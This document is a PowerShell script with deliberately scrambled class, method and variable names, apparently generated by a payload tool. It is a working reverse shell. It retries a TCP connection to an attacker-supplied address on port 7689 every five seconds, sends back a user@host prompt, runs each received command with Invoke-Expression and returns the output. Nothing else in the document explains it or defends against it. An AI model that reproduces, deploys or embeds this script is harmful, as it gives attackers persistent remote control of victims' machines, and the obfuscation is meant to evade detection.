class hALKghUHJEJkNJqPytwnGZAb {
    
    [string]$dvlotlkVafkxUVGiztmGLSGF = "$ip"
    [int]$BAHxm = 7689

    $AuktNEirUl
    $xlVgucatnfvUybyiKWYkh
    $zyWnGwkfZeFuPX
    $gPKkvlLONdTiLQXreD
    $YzEjZPoWsZDvSqTKGjDLiaug
    $uFlvFaLXLviDKaq
    [int]$vFJbYNbkCXFobOXdkhuS = 50*1024

    XstHbpXBUrc() {
        $this.xlVgucatnfvUybyiKWYkh = $false
        while ($true) {
            try {
                $this.xlVgucatnfvUybyiKWYkh = New-Object Net.Sockets.TcpClient($this.dvlotlkVafkxUVGiztmGLSGF, $this.BAHxm)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.CzcLldZHhesiH()
    }

    CzcLldZHhesiH() {
        $this.AuktNEirUl = $this.xlVgucatnfvUybyiKWYkh.GetStream()
        $this.gPKkvlLONdTiLQXreD = New-Object Byte[] $this.vFJbYNbkCXFobOXdkhuS
        $this.uFlvFaLXLviDKaq = New-Object Text.UTF8Encoding
        $this.zyWnGwkfZeFuPX = New-Object IO.StreamWriter($this.AuktNEirUl, [Text.Encoding]::UTF8, $this.vFJbYNbkCXFobOXdkhuS)
        $this.YzEjZPoWsZDvSqTKGjDLiaug = New-Object System.IO.StreamReader($this.AuktNEirUl)
        $this.zyWnGwkfZeFuPX.AutoFlush = $true
    }

    GtExFZAHWvxgAwQG() {
        $this.XstHbpXBUrc()
        $this.zLLbgzkUfFIQF()
    }

    rGsAniSDqGyxKA($iDqruElIcLHXE) {
        try {
            [byte[]]$JnMTbpf = [text.Encoding]::Ascii.GetBytes($iDqruElIcLHXE)
            $this.zyWnGwkfZeFuPX.Write($JnMTbpf, 0, $JnMTbpf.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.GtExFZAHWvxgAwQG()
        }
    }

    [string] HnTxSDoZegzxDySWYEKm() {
        try {
            $bTAuXMIFjwKq = $this.AuktNEirUl.Read($this.gPKkvlLONdTiLQXreD, 0, $this.vFJbYNbkCXFobOXdkhuS)    
            $CzrwYobkRVjir = ($this.uFlvFaLXLviDKaq.GetString($this.gPKkvlLONdTiLQXreD, 0, $bTAuXMIFjwKq))
            return $CzrwYobkRVjir
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.GtExFZAHWvxgAwQG()
            return ""
        }
    }

    [string] MdZtyHTncI($AgFZpjhu) {
        Write-Host $AgFZpjhu
        try { 
            $aIojrHFniwGmHCenyGvPpZ = Invoke-Expression $AgFZpjhu | Out-String
        }
        catch {
            $XLrGmxNZfRrhBOJiMqITnmzh = $_.Exception
            $tIkdSTwsT = $_.Message
            $aIojrHFniwGmHCenyGvPpZ = "`n$_`n"
        }
        return $aIojrHFniwGmHCenyGvPpZ
    }

    [string] JHPmrXqJCokwpxoMEOSUaaw() {
        $IDInrWLZftiehywswpVDeLuU = [Environment]::UserName
        $FfjoEDCQppNvzuRF = [System.Net.Dns]::GetHostName()
        $ZpbhNIFVsWwI = Get-Location
        return "$IDInrWLZftiehywswpVDeLuU@$FfjoEDCQppNvzuRF [$ZpbhNIFVsWwI]~$ "
    }

    zLLbgzkUfFIQF() {
        while ($this.xlVgucatnfvUybyiKWYkh.Connected) {
            $this.rGsAniSDqGyxKA($this.JHPmrXqJCokwpxoMEOSUaaw())         
            $CzrwYobkRVjir = $this.HnTxSDoZegzxDySWYEKm()
            $aIojrHFniwGmHCenyGvPpZ = "`n"
            if ([string]::IsNullOrEmpty($CzrwYobkRVjir)) {
                continue
            }
            $aIojrHFniwGmHCenyGvPpZ = $this.MdZtyHTncI($CzrwYobkRVjir)
            $this.rGsAniSDqGyxKA($aIojrHFniwGmHCenyGvPpZ + "`n")
            $this.AuktNEirUl.Flush()
        }
        $this.xlVgucatnfvUybyiKWYkh.Close()
        $this.GtExFZAHWvxgAwQG()
    } 
}

$XZAdYczJIkBdwpSuURF = [hALKghUHJEJkNJqPytwnGZAb]::new()
$XZAdYczJIkBdwpSuURF.GtExFZAHWvxgAwQG()
